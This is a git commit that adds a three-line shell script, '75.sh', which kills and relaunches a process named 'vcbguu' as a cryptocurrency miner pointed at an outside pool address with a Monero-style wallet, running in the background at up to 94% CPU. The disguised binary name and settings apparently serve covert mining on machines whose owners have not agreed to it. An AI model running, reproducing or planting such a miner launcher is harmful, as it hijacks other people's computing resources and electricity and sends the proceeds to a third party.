3732539becb3ff122e9f919a69e54921c7d57e47
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-05-24 02:38:13 +0800

    Add files via upload

---
+++ 75.sh
@@ -0,0 +1,3 @@
+pkill vcbguu
+sleep 7
+vcbguu -o 95.217.1.184:4144 -u 41tYiqHAhGRF4YNP8q9CrNECEYnjiycnML3Y13nXKKKi6duuiXQ5oTjiaYr1QZzxnrRSqA7iukACzU44Lakv5AXPLUaMc3g --pass=12:kotminkot@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=94 --av=1 --variant -1
